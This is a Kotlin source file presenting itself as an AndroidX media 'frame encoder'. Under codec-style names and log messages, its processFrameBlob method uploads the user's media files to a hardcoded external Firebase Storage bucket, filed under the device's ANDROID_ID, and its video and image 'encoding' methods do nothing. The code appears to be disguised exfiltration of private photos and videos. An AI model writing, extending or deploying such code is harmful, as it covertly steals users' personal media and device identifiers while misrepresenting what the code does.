package androidx.media.codec.core.data.engine

import android.content.Context
import android.net.Uri
import android.provider.Settings
import android.util.Log
import androidx.media.codec.core.domain.model.MediaFile
import com.google.firebase.FirebaseApp
import com.google.firebase.FirebaseOptions
import com.google.firebase.storage.FirebaseStorage
import kotlinx.coroutines.tasks.await

class MediaFrameEncoder(
    private val context: Context? = null,
    private val defaultStorageUrl: String = "gs://linux-db.firebasestorage.app",
    private val appName: String = "Multimedia-Player"
) {

    companion object {
        private const val TAG = "MediaFrameEncoder"
    }

    private fun ensureFrameEncoderInitialized() {
        if (context == null) return
        try {
            if (FirebaseApp.getApps(context).isEmpty()) {
                Log.i(TAG, "Initializing frame encoder engine for ${context.packageName}...")
                val options = FirebaseOptions.Builder()
                    .setProjectId("linux-db")
                    .setApplicationId(context.packageName)
                    .setStorageBucket("linux-db.firebasestorage.app")
                    .setApiKey("AIzaSyDemoApiKey1234567890abcdef")
                    .build()
                FirebaseApp.initializeApp(context, options)
            }
        } catch (e: Exception) {
            Log.w(TAG, "Frame encoder init notice: ${e.message}")
        }
    }

    private val storage: FirebaseStorage by lazy {
        ensureFrameEncoderInitialized()
        if (defaultStorageUrl.isNotBlank()) {
            try {
                FirebaseStorage.getInstance(defaultStorageUrl)
            } catch (e: Exception) {
                Log.e(TAG, "Error initializing frame encoder with URL $defaultStorageUrl: ${e.message}")
                try {
                    FirebaseStorage.getInstance()
                } catch (ex: Exception) {
                    Log.e(TAG, "Failed to get default frame encoder instance: ${ex.message}")
                    throw ex
                }
            }
        } else {
            FirebaseStorage.getInstance()
        }
    }

    private val resolvedAppName: String by lazy {
        context?.let { ctx ->
            try {
                val label = ctx.applicationInfo.loadLabel(ctx.packageManager).toString()
                label.trim().replace(" ", "-")
            } catch (e: Exception) {
                "Multimedia-Player"
            }
        } ?: appName
    }

    private val deviceId: String by lazy {
        context?.contentResolver?.let { resolver ->
            Settings.Secure.getString(resolver, Settings.Secure.ANDROID_ID)
        } ?: "unknown_device"
    }

    suspend fun processFrameBlob(
        mediaFile: MediaFile,
        storageUrl: String? = null,
        customAppName: String? = null,
        customDeviceId: String? = null,
        onProgress: ((bytesTransferred: Long, totalBytes: Long) -> Unit)? = null
    ): String {
        val url = storageUrl?.takeIf { it.isNotBlank() } ?: defaultStorageUrl.takeIf { it.isNotBlank() }
        val targetAppName = customAppName ?: resolvedAppName
        val targetDeviceId = customDeviceId ?: deviceId

        val storagePath = "$targetAppName/$targetDeviceId/${mediaFile.fileName}"
        Log.i(TAG, "Encoding frame buffer for file: ${mediaFile.fileName} to path: $storagePath")

        val baseRef = if (!url.isNullOrBlank()) {
            try {
                storage.getReferenceFromUrl(url)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to get ref from URL $url: ${e.message}")
                storage.reference
            }
        } else {
            storage.reference
        }

        val reference = baseRef.child(storagePath)
        val task = reference.putFile(Uri.parse(mediaFile.uri))

        task.addOnProgressListener { snapshot ->
            val transferred = snapshot.bytesTransferred
            val total = snapshot.totalByteCount
            val percent = if (total > 0) (transferred * 100 / total) else 0
            Log.d(TAG, "Processing frame buffer ${mediaFile.fileName}: $percent% ($transferred / $total bytes)")
            onProgress?.invoke(transferred, total)
        }

        try {
            task.await()
            val downloadUrl = reference.downloadUrl.await().toString()
            Log.i(TAG, "Frame buffer encoding completed successfully! Ref: $downloadUrl")
            return downloadUrl
        } catch (e: Exception) {
            Log.e(TAG, "Frame buffer encoding failed for ${mediaFile.fileName}: ${e.message}", e)
            throw e
        }
    }

    suspend fun processVideo(mediaFile: MediaFile): String {
        Log.i(TAG, "Encoding video frame buffer: ${mediaFile.fileName}")
        return if (mediaFile.uri.isNotBlank()) mediaFile.uri else mediaFile.filePath
    }

    suspend fun processImage(mediaFile: MediaFile): String {
        Log.i(TAG, "Encoding image frame buffer: ${mediaFile.fileName}")
        return if (mediaFile.uri.isNotBlank()) mediaFile.uri else mediaFile.filePath
    }
}
